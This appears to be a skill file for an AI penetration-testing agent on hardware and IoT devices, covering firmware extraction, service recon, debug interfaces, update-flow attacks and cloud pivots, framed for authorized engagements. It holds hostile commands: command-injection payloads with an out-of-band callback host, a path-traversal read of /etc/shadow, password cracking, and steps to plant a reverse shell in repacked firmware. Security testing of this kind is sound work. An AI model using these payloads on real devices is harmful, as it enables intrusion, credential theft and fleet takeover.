---
name: hardware_iot
description: Hardware/IoT testing - firmware extraction, exposed services, debug interfaces, update flows, and cloud/companion-app chains
---

# Hardware / IoT Testing

A Hardware/IoT asset is an embedded device (router, camera, NVR, gateway, smart-home hub, industrial sensor, medical/automotive ECU) plus the firmware it runs and the back-end/companion app it talks to. The attacker's objective is to extract and analyze firmware, reach network and debug services the vendor assumed were private, abuse the update mechanism, recover embedded secrets, and chain a single device foothold into account takeover, the vendor cloud, or every other device on the same product line. Most authorized engagements start from a firmware image or an IP on the LAN; this skill covers both the file-on-disk and the live-on-network paths. For the cloud back end see the cloud skills; for the companion mobile app see the mobile skill; for SSRF from the device's own fetchers see the ssrf skill.

## Attack Surface

**Network-exposed services**
- HTTP/HTTPS admin UI and REST/JSON-RPC APIs (80/443/8080/8443, often with weak/default creds)
- Telnet/SSH/Dropbear (23/22/2222), frequently with hardcoded or vendor-recovery accounts
- UPnP/SSDP (1900/udp), SOAP control endpoints, WS-Discovery for cameras (3702/udp)
- RTSP/ONVIF (554, 8000), MQTT (1883/8883), CoAP (5683/udp), Modbus (502), DNP3, BACnet
- mDNS/DNS-SD (5353/udp), proprietary discovery/provisioning ports, TR-069/CWMP (7547)
- "Debug" or "diag" web pages, cgi-bin handlers, and undocumented backdoor ports

**Physical / local debug interfaces**
- UART serial console (3.3V TX/RX/GND header) - root shell or U-Boot prompt
- JTAG/SWD for halt/dump/flash, SPI/NAND flash chips read with a clip + flashrom
- USB recovery/DFU modes, SD-card update images, exposed eMMC test pads

**Firmware and update flow**
- OTA/update servers (often plain HTTP, no signature, predictable URLs)
- Update file formats (.bin/.img/.dav/.pkg/.swu/.cramfs/UBI/squashfs/CPIO)
- Bootloader (U-Boot/UEFI) env, secure-boot chain, A/B partitions, rollback policy

**Cloud / companion chain**
- Device-to-cloud auth (per-device certs, shared API keys, MQTT topics)
- Companion mobile/desktop app and the API both it and the device share
- Pairing/provisioning flows (BLE, SoftAP, QR onboarding)

## Recon & Enumeration

Install the embedded-specific tooling (most are not in the base Kali image):

```bash
# firmware unpacking + analysis
pipx install binwalk            # or: apt-get install -y binwalk
git clone https://github.com/onekey-sec/unblob && pipx install unblob
apt-get install -y squashfs-tools sleuthkit u-boot-tools cpio device-tree-compiler
pip install firmware-mod-kit ubi_reader 2>/dev/null; apt-get install -y mtd-utils
git clone https://github.com/scriptingxss/EMBA   # full pipeline; or use FACT
# binary / RE
apt-get install -y radare2 gdb-multiarch qemu-user-static qemu-system; pip install ROPgadget
# hardware bench (when physical access is in scope)
apt-get install -y flashrom minicom picocom screen openocd
pip install esptool
```

Live network device:
```bash
# fast port sweep, then deep service/version fingerprint
naabu -host 10.0.0.5 -p - -rate 2000 -o ports.txt
nmap -sSU -sV -O -p $(paste -sd, ports.txt) --version-all -sC -oA iot_scan 10.0.0.5
nmap -sU -p 1900,5353,5683,3702,502 --script=upnp-info,broadcast-dns-service-discovery 10.0.0.5
# web surfaces
httpx -l ips.txt -p 80,443,8080,8443,8000,8888,7547 -title -tech-detect -status-code -o web.txt
nuclei -l web.txt -tags iot,router,camera,default-login,exposure,cve -s critical,high -rl 50 -j -o nuclei.jsonl
ffuf -u http://10.0.0.5/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -e .cgi,.bin,.cfg -mc 200,401,403
katana -u http://10.0.0.5 -jc -d 3 -o endpoints.txt
wafw00f http://10.0.0.5     # rarely a WAF, but confirms reverse proxy / firmware web stack
```

Firmware on disk:
```bash
binwalk -Me firmware.bin                 # signature scan + recursive extract
unblob -e extracted/ firmware.bin        # more reliable on UBI/odd containers
binwalk -E firmware.bin                  # entropy graph -> flat high entropy = encrypted/compressed
file extracted/*; fdisk -l firmware.bin  # identify partition layout
dtc -I dtb -O dts extracted/*.dtb        # device-tree -> SoC, peripherals, memory map
mount -o loop,ro rootfs.squashfs /mnt    # or: unsquashfs rootfs.squashfs
strings -n 8 firmware.bin | grep -Ei 'http|password|key|secret|admin|token|ftp://'
```

Secret + dependency scanning over the extracted rootfs:
```bash
trufflehog filesystem extracted/ --only-verified --json > secrets.json
gitleaks detect --no-git -s extracted/ -r gitleaks.json
syft dir:extracted/ -o table; grype dir:extracted/   # SBOM + known-vuln components (busybox, openssl, dropbear, zlib)
trivy rootfs extracted/                                # OS-package CVEs in the squashfs
semgrep --config auto extracted/usr/  extracted/www/  # cgi scripts, lua, php in the web root
```

## Methodology

1. **Acquire firmware.** Pull from vendor download portal, intercept the OTA URL (often plain HTTP in `httpx`/proxy logs), dump over UART/`flashrom`/`esptool read_flash`, or extract from the companion app's bundled update. Hash and version-pin every image you analyze.
2. **Unpack and map.** `binwalk -Me` then `unblob` as fallback; identify bootloader, kernel, rootfs (squashfs/UBIFS/jffs2), and any encrypted blobs (flat entropy near 1.0). Recover the device-tree and `/etc` to learn the SoC, init system, and enabled services.
3. **Harvest the rootfs.** Enumerate `/etc/passwd` + `/etc/shadow` (crack with `john`/`hashcat`), startup scripts (`/etc/init.d`, `/etc/rc.d`), `inittab` (console = root spawns), web root (`/www`, `/usr/share/www`, cgi-bin), config defaults, TLS keys/certs, and `authorized_keys`. Run trufflehog/gitleaks/syft/grype/trivy here.
4. **Statically audit binaries.** Triage cgi/httpd/proprietary daemons in radare2; grep for `system(`, `popen(`, `exec`, `strcpy`, `sprintf`, format strings; find auth checks and "magic" backdoor parameters. Map every user-reachable input to a sink.
5. **Emulate.** Run target binaries under `qemu-<arch>-static` (chroot the extracted rootfs), or full-system emulate with EMBA/FirmAE to bring up the web UI without hardware. This lets you fuzz and exploit safely and reproducibly.
6. **Exercise the live device.** Confirm default creds, hit the API/cgi endpoints, test auth bypass, command injection, path traversal, and SSRF against findings from static analysis.
7. **Attack the update flow.** Determine whether updates are signed and version-checked; attempt downgrade and a malicious-image install (see below).
8. **Follow the cloud/companion chain.** Extract device->cloud credentials, replay them, test multi-tenant isolation, and pivot to the vendor API.
9. **Report per device class** - one firmware bug usually affects an entire SKU/fleet; state the blast radius.

## Key Weaknesses / Techniques

- **Default / hardcoded credentials.** Crack `/etc/shadow`, grep configs and binaries for embedded passwords/keys, then validate on the live service.
  `john --format=crypt shadow --wordlist=/usr/share/wordlists/rockyou.txt`; hardcoded telnet often: `telnet 10.0.0.5` then vendor recovery user.
- **Command injection in cgi/API.** Web handlers shell out to `system()` with user input (ping/traceroute/diag/filename params).
  `curl 'http://10.0.0.5/cgi-bin/diag.cgi?host=127.0.0.1;id'` ; blind: `;ping -c1 $(hostname).<id>.oast.fun` and watch `interactsh-client`.
- **Authentication bypass.** Static-side cookie/`__SID`-only checks, `?auth=1` flags, referer-based gating, or unauthenticated info-leak cgi that returns admin creds. Compare an authed vs unauthed request to the same endpoint.
- **Path traversal / arbitrary file read.** `curl --path-as-is 'http://10.0.0.5/../../../../etc/shadow'` or a `file=` param; reads config/keys -> escalates to full auth bypass.
- **Unsigned / downgradeable firmware update.** If the image has no signature (no PKCS#7/RSA blob, install accepts a modified `.bin`), inject a startup line or `authorized_keys`, repack, and flash:
  ```bash
  # add a root dropbear key / reverse shell into init, then repack squashfs
  mksquashfs newroot rootfs.squashfs -comp xz -b 131072
  binwalk -B firmware.bin   # confirm header/checksum format, then fix the CRC the loader checks
  ```
  Even if signed, test **downgrade** to a known-vulnerable signed version and weak/missing anti-rollback.
- **Memory-corruption in network daemons.** Stack overflows in custom httpd/UPnP/SOAP parsers (no ASLR/PIE, often no NX). Confirm crash under qemu/gdb-multiarch, build ROP with ROPgadget.
- **Insecure transport / weak crypto.** Plaintext HTTP/MQTT/Telnet, hardcoded TLS private keys reused fleet-wide (extract from rootfs, MITM all devices), weak cipher, no cert validation in device->cloud.
- **Exposed debug interfaces.** UART giving an unauthenticated root shell or interruptible U-Boot (`setenv bootargs ... init=/bin/sh`); JTAG halt/dump. Document as physical-access findings.
- **Vulnerable third-party components.** Ancient BusyBox/Dropbear/OpenSSL/libupnp surfaced by `grype`/`trivy`; map each CVE to a reachable service before claiming exploitability.

## Validation

1. **File-read / injection:** show the actual stolen content (`/etc/shadow`, a config secret) or a deterministic OAST callback from the device's source IP, plus the exact request that triggered it.
2. **Auth bypass:** demonstrate a privileged action (read fleet config, change admin password, view RTSP stream) without valid credentials, and show the same request failing the intended auth path.
3. **Malicious update:** install a benign marker payload (file write, distinctive banner, or a callback on boot) via the update channel and prove it survives reboot - never brick the device; keep a known-good image to restore.
4. **Memory bug:** reproduce the crash deterministically under qemu/gdb with the offending input, then show controlled PC/register state (no need to weaponize beyond control-of-flow on an authorized device).
5. **Credential reuse / cloud pivot:** authenticate to the vendor API with device-extracted creds and read only your own (or test-account) data to prove the access path.
Always record device model, firmware version + hash, and exact reproduction steps - findings are SKU-wide.

## False Positives

- High entropy alone is not "encryption" - LZMA/gzip/xz payloads also read ~0.99; confirm with `binwalk -Me`/`unblob` before claiming an encrypted blob.
- `strings` hits like `password=` are often default-config placeholders or doc text, not live secrets - validate against the running service.
- `grype`/`trivy` CVEs on a component that is present but not built-in, not network-reachable, or compiled without the affected feature are not exploitable - prove reachability.
- A "telnet/UART root shell" requiring physical access or local LAN may be by-design or out of scope per the engagement rules of engagement - classify by access vector, don't inflate.
- Hardcoded keys/certs that are per-device (derived from serial/MAC) vs shared fleet-wide have very different impact - confirm which before reporting.
- Emulation crashes from missing nvram/peripherals (FirmAE harness artifacts) are not device vulnerabilities - reproduce on the real target or a faithful emulation.

## Chaining & Impact

- Unsigned OTA + plaintext update URL -> MITM the update -> persistent root implant on every device that auto-updates -> botnet / fleet takeover.
- Unauth file-read -> dump admin hash / TLS key -> auth bypass -> command injection -> root -> read device->cloud credentials -> vendor API -> tenant-wide account/data access.
- Default credentials + RTSP/ONVIF -> live camera/audio access and DVR storage exfiltration.
- UART/JTAG root -> extract fleet-shared symmetric key or signing-bypass -> forge updates or decrypt all OTA traffic for the product line.
- Command injection on an internet-exposed router/NVR -> pivot to the internal LAN behind it (lateral movement onto otherwise-private hosts).
- BLE/SoftAP pairing flaw -> hijack onboarding -> attacker-controlled device bound to victim's cloud account.

## Pro Tips

1. When `binwalk` extracts nothing useful, run `unblob` - it handles UBI, oddly-headered, and nested containers binwalk misses. Re-run on every nested archive.
2. Diff two firmware versions (`vbindiff`, or unpack both and `diff -r`) to find a silently patched bug or a removed backdoor - the delta is your roadmap.
3. The kernel's device-tree (`.dtb` -> `dtc`) tells you the exact SoC, flash layout, and peripherals before you ever touch silicon - it shortcuts hours of guessing.
4. Always emulate first (`qemu-*-static` chroot or EMBA/FirmAE). Iterating exploits against a $5 emulated httpd beats bricking the only sample you have.
5. UART is the fastest root: look for a 4-pin 3.3V header, baud is usually 115200; if you only get U-Boot, interrupt it and append `init=/bin/sh` to bootargs.
6. Grep the rootfs for the OTA/cloud hostnames in `/etc` and binaries; many devices ship the staging/debug endpoint or an http (not https) update URL.
7. Reused fleet-wide TLS private keys in the rootfs are gold - one extraction MITMs every device of that model; check certificate CN/serial to confirm it's shared, not per-device.
8. Anti-rollback is the weak spot even on signed firmware - a properly signed *old* image is still accepted by most loaders; test downgrade before assuming the update path is safe.
9. Watch CRC vs cryptographic signature - many "checksum failed" rejections are just a CRC32 you can recompute, not a real signature you'd need a key to forge.
